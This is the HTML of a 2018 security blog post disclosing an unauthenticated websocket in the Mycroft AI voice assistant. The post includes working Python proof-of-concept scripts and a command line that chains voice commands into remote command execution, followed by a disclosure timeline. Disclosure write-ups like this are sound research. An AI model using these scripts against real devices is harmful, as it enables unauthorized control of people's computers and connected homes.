@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Getting &#34;Zero Click&#34; Remote Code Execution in Mycroft AI vocal assistant</title>
+  <meta property="og:title" content="Getting &#34;Zero Click&#34; Remote Code Execution in Mycroft AI vocal assistant" />
+  <meta name="twitter:title" content="Getting &#34;Zero Click&#34; Remote Code Execution in Mycroft AI vocal …" />
+  <meta name="description" content="&ldquo;Hey Mycroft, we&rsquo;ve got a Problem&rdquo; Introduction During my journey contributing to open source I was working with my friend Matteo De Carlo on an AUR Package of a really interesting project called Mycroft AI. It&rsquo;s an AI-powered vocal assistant started with a crowdfunding campaign in 2015 and a more recent one that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on Jaguar F-Type and Land Rover">
+  <meta property="og:description" content="&ldquo;Hey Mycroft, we&rsquo;ve got a Problem&rdquo; Introduction During my journey contributing to open source I was working with my friend Matteo De Carlo on an AUR Package of a really interesting project called Mycroft AI. It&rsquo;s an AI-powered vocal assistant started with a crowdfunding campaign in 2015 and a more recent one that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on Jaguar F-Type and Land Rover">
+  <meta name="twitter:description" content="&ldquo;Hey Mycroft, we&rsquo;ve got a Problem&rdquo; Introduction During my journey contributing to open source I was working with my friend Matteo De Carlo on an AUR Package of a really interesting …">
+  <meta name="author" content="Francesco Giordano"/>
+  <link href='https://nhoya.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://nhoya.github.io/img/cat.jpg" />
+  <meta name="twitter:image" content="https://nhoya.github.io/img/cat.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@0x7a657461" />
+  <meta name="twitter:creator" content="@0x7a657461" />
+  <meta property="og:url" content="https://nhoya.github.io/post/mycroftai-rce/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="0x7a" />
+
+  <meta name="generator" content="Hugo 0.46" />
+  <link rel="canonical" href="https://nhoya.github.io/post/mycroftai-rce/" />
+  <link rel="alternate" href="https://nhoya.github.io/index.xml" type="application/rss+xml" title="0x7a">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://nhoya.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://nhoya.github.io/css/syntax.css" /><link rel="stylesheet" href="https://nhoya.github.io/css/codeblock.css" />
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://nhoya.github.io">0x7a</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent" href="javascript:void(0)">CTF</a>
+              <div class="navlinks-children">
+                
+                  <a href="https://jbzteam.github.io">JBZ Team</a>
+                
+                  <a href="https://capturetheflag.it">capturetheflag.it</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent" href="javascript:void(0)">Writeups</a>
+              <div class="navlinks-children">
+                
+                  <a href="https://nhoya.github.io/post/pastebin-reddit-xss/">Pastebin and Reddit Markdown XSS</a>
+                
+                  <a href="https://github.com/Nhoya/MycroftAI-RCE">Mycroft AI &#34;Zero Click&#34; Remote Code Execution</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent" href="javascript:void(0)">Projects</a>
+              <div class="navlinks-children">
+                
+                  <a href="https://github.com/Nhoya/gOSINT">gOSINT</a>
+                
+                  <a href="https://github.com/Nhoya/SplitShare">SplitShare</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About Me" href="https://nhoya.github.io/page/about">About Me</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    <div class="avatar-container">
+      <div class="avatar-img-border">
+        
+          <a title="0x7a" href="https://nhoya.github.io">
+            <img class="avatar-img" src="https://nhoya.github.io/img/cat.jpg" alt="0x7a" />
+          </a>
+        
+      </div>
+    </div>
+
+  </div>
+</nav>
+
+
+
+
+    
+  
+  
+  
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              <h1>Getting &#34;Zero Click&#34; Remote Code Execution in Mycroft AI vocal assistant</h1>
+                
+                
+                  <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on June 10, 2018
+  
+  
+  
+</span>
+
+
+                
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+
+<h1 id="hey-mycroft-we-ve-got-a-problem">&ldquo;Hey Mycroft, we&rsquo;ve got a Problem&rdquo;</h1>
+
+<p><img src="https://dmtyylqvwgyxw.cloudfront.net/instances/132/uploads/images/custom_image/image/466/normal_9b94a225-8605-4d78-82d2-4c59f6981c57.jpg" alt="Mycroft AI" /></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>During my journey contributing to open source I was working with my friend <a href="https://github.com/portaloffreedom">Matteo De Carlo</a> on an <a href="https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD">AUR Package</a> of a really interesting project called <a href="https://mycroft.ai">Mycroft AI</a>. It&rsquo;s an AI-powered vocal assistant started with a <a href="https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for">crowdfunding campaign</a> in 2015 and a <a href="https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/">more recent one</a> that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on <a href="https://www.youtube.com/watch?v=6GHmzbXp_jY">Jaguar F-Type</a> and <a href="https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/">Land Rover</a></p>
+
+<h2 id="digging-in-the-source-code">Digging in the source code</h2>
+
+<p>While looking at the <a href="https://github.com/MycroftAI/mycroft-core">source code</a> I found an interesting point: <a href="https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57">here</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">...</span>
+<span class="n">host</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">)</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;port&#34;</span><span class="p">)</span>
+<span class="n">route</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;route&#34;</span><span class="p">)</span>
+<span class="n">validate_param</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="s2">&#34;websocket.host&#34;</span><span class="p">)</span>
+<span class="n">validate_param</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="s2">&#34;websocket.port&#34;</span><span class="p">)</span>
+<span class="n">validate_param</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="s2">&#34;websocket.route&#34;</span><span class="p">)</span>
+
+<span class="n">routes</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">WebsocketEventHandler</span><span class="p">)</span>
+<span class="p">]</span>
+<span class="n">application</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span> <span class="o">**</span><span class="n">settings</span><span class="p">)</span>
+<span class="n">application</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+<span class="n">ioloop</span><span class="o">.</span><span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="o">...</span></code></pre></div>
+<p>it defines a websocket server that uses to get instructions from the remote clients (like the <a href="https://github.com/MycroftAI/Mycroft-Android">Android one</a>). The settings for the websocket server are defined in <a href="https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117">mycroft.conf</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="err">//</span> <span class="err">The</span> <span class="err">mycroft-core</span> <span class="err">messagebus&#39;</span> <span class="err">websocket</span>
+  <span class="s2">&#34;websocket&#34;</span><span class="err">:</span> <span class="p">{</span>
+    <span class="nt">&#34;host&#34;</span><span class="p">:</span> <span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="mi">8181</span><span class="p">,</span>
+    <span class="nt">&#34;route&#34;</span><span class="p">:</span> <span class="s2">&#34;/core&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;ssl&#34;</span><span class="p">:</span> <span class="kc">false</span>
+<span class="p">}</span><span class="err">,</span></code></pre></div>
+<p>So there is a websocket server that doesn&rsquo;t require authentication that by default is exposed on <code>0.0.0.0:8181/core</code>. Let&rsquo;s test it 😉</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">asyncio</span>
+<span class="kn">import</span> <span class="nn">websockets</span>
+
+<span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;ws://myserver:8181/core&#34;</span>
+<span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;say pwned&#34;</span>
+
+<span class="n">async</span> <span class="k">def</span> <span class="nf">sendPayload</span><span class="p">():</span>
+    <span class="n">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
+        <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">data</span><span class="se">\&#34;</span><span class="s2">: {</span><span class="se">\&#34;</span><span class="s2">utterances</span><span class="se">\&#34;</span><span class="s2">: [</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">command</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">]}, </span><span class="se">\&#34;</span><span class="s2">type</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">recognizer_loop:utterance</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">context</span><span class="se">\&#34;</span><span class="s2">: null}&#34;</span><span class="p">)</span>
+
+<span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span></code></pre></div>
+<p>And magically we have an answer from the vocal assistant saying <code>pwned</code>!</p>
+
+<p>Well, now we can have Mycroft pronounce stuff remotely, but this is not a really big finding unless you want to scare your friends, right?</p>
+
+<p><img src="https://media1.tenor.com/images/8a4a99d3bd67ba8d9a025c36edf4a624/tenor.gif" alt="Trump WRONG" /></p>
+
+<h2 id="the-skills-system">The skills system</h2>
+
+<p>Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)</p>
+
+<p>How is a skill composed? From what we can see from the documentation a default skill is composed by:</p>
+
+<ul>
+<li><code>dialog/en-us/command.dialog</code> contains the vocal command that will trigger the skill</li>
+<li><code>vocab/en-us/answer.voc</code> contains the answer that Mycroft will pronounce</li>
+<li><code>requirements.txt</code> contains the requirements for the skill that will be installed with <code>pip</code></li>
+<li><code>__int__.py</code> contains the main function of the skill and will be loaded when the skill is triggered</li>
+</ul>
+
+<h2 id="what-can-i-do-now">What can I do now?</h2>
+
+<p>I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.</p>
+
+<h3 id="so-i-m-done">So I&rsquo;m done?</h3>
+
+<p>Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better&hellip;</p>
+
+<h2 id="getting-a-remote-shell-using-default-skills">Getting a remote shell using default skills</h2>
+
+<p>We know that Mycroft has some <a href="https://github.com/MycroftAI/mycroft-skills">default skills</a> like <code>open</code> that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called <code>skill-autogui</code>, whose description says <code>Manipulate your mouse and keyboard with Mycroft</code>. <strong>We got it!</strong></p>
+
+<p>Let&rsquo;s try to combine everything we found so far into a PoC:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">asyncio</span>
+<span class="kn">import</span> <span class="nn">websockets</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+
+<span class="n">cmds</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;mute audio&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+<span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;ws://myserver:8181/core&#34;</span>
+
+
+<span class="n">async</span> <span class="k">def</span> <span class="nf">sendPayload</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">:</span>
+        <span class="n">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
+            <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">data</span><span class="se">\&#34;</span><span class="s2">: {</span><span class="se">\&#34;</span><span class="s2">utterances</span><span class="se">\&#34;</span><span class="s2">: [</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">]}, </span><span class="se">\&#34;</span><span class="s2">type</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">recognizer_loop:utterance</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">context</span><span class="se">\&#34;</span><span class="s2">: null}&#34;</span><span class="p">)</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span></code></pre></div>
+<p>Running the exploit with <code>python pwn.py &quot;install autogui&quot; &quot;open xterm&quot; &quot;type echo pwned&quot; &quot;press enter&quot;</code>  allowed me to finally get a command execution on a Linux machine.</p>
+
+<p><img src="https://raw.githubusercontent.com/Nhoya/MycroftAI-RCE/master/PoC.gif" alt="PoC" /></p>
+
+<p><img src="https://thumbs.gfycat.com/PleasedEducatedGalah-size_restricted.gif" alt="WASSUUUUUUUUUUUUUUUUUUUUUUUUP" /></p>
+
+<h2 id="notes"><em>Notes</em></h2>
+
+<ul>
+<li><code>open xterm</code> was needed because my test Linux environment had a DE installed, on a remote server the commands will be executed directly on TTY so this step is not nesessary.</li>
+<li>The skill branching had a <a href="https://mycroft.ai/blog/skill-branching-18-02/">big change</a> and now some skills are not (yet) available (autogui is one of them) but this is not the real point. Mycroft has skills to interact with domotic houses and other services that can still be manipulated (the lack of imagination is the limit here). The vulnerability lies in the lack of authentication for the ws.</li>
+</ul>
+
+<h2 id="affected-devices">Affected devices</h2>
+
+<p>All the devices running Mycroft &lt;= ? with the websocket server exposed (Mark-I has the websocket behind a firewall by default)</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+<li>08/03/2018 Vulnerability found</li>
+<li>09/03/2018 Vulnerability reported</li>
+<li>13/03/2018 The CTO answered that they are aware of this problem and are currently working on a patch</li>
+<li>06/06/2018 The CTO said that they have no problem with the release of the vulnerability and will add a warning to remember the user to use a firewall <code>¯\_(ツ)_/¯</code></li>
+<li>09/06/2018 Public disclosure</li>
+</ul>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://nhoya.github.io/tags/writeup/">Writeup</a>&nbsp;
+            
+              <a href="https://nhoya.github.io/tags/code-review/">Code Review</a>&nbsp;
+            
+              <a href="https://nhoya.github.io/tags/ai/">AI</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <ul class="list-inline footer-links">
+                
+
+
+<li>
+    <a href="//twitter.com/share?url=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f&amp;text=Getting%20%22Zero%20Click%22%20Remote%20Code%20Execution%20in%20Mycroft%20AI%20vocal%20assistant&amp;via=0x7a657461"
+       target="_blank" alt="" title="Share on Twitter">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//plus.google.com/share?url=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f" target="_blank" title="Share on Google Plus">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-google-plus fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f" target="_blank" title="Share on Facebook">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//reddit.com/submit?url=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f&amp;title=Getting%20%22Zero%20Click%22%20Remote%20Code%20Execution%20in%20Mycroft%20AI%20vocal%20assistant" target="_blank" title="Share on Reddit">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-reddit fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f&amp;title=Getting%20%22Zero%20Click%22%20Remote%20Code%20Execution%20in%20Mycroft%20AI%20vocal%20assistant" target="_blank"
+       title="Share on LinkedIn">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f&amp;title=Getting%20%22Zero%20Click%22%20Remote%20Code%20Execution%20in%20Mycroft%20AI%20vocal%20assistant" target="_blank"
+       title="Share on StumbleUpon">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-stumbleupon fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fnhoya.github.io%2fpost%2fmycroftai-rce%2f&amp;description=Getting%20%22Zero%20Click%22%20Remote%20Code%20Execution%20in%20Mycroft%20AI%20vocal%20assistant" target="_blank"
+       title="Share on Pinterest">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-pinterest fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+              </ul>
+            </section>
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://nhoya.github.io/post/pastebin-reddit-xss/" data-toggle="tooltip" data-placement="top" title="XSS via unsanitized markdown output in pastebin.com and reddit.com">&larr; Previous Post</a>
+            </li>
+          
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/Nhoya" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/0x7a657461" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://paypal.me/nhoya" title="PayPal">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-paypal fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              Francesco Giordano
+            
+          
+
+          &nbsp;&bull;&nbsp;
+          2018
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://nhoya.github.io">0x7a</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo</a> powered</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://nhoya.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://nhoya.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
